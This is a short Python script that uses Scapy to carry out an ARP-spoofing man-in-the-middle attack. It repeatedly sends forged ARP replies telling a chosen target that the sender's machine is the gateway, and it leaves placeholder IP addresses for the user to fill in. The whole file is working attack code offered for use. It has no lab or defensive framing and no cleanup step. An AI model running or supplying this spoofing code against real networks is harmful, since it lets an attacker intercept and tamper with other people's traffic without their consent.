'''
Python script utilizing Scapt to perform a MITM using ARP Spoof.
'''

from scapy.all import *
import time

target_ip = "8.8.8.8" # Change target IP to desired IP.
gateway_ip = "10.0.0.1" # Change gateway IP to dired gateway
target_mac = getmacbyip(target_ip)  # Resolve target MAC address

# Create ARP response telling target you are the gateway
arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op="is-at")

print(f"ARP Spoofing {target_ip}, telling it we are the gateway {gateway_ip}...")

# Send ARP spoof packets every 2 seconds
while True:
    send(arp_response, verbose=0)
    print(f"Sent to {target_ip}: {gateway_ip} is-at {arp_response.hwsrc}")
    time.sleep(2)
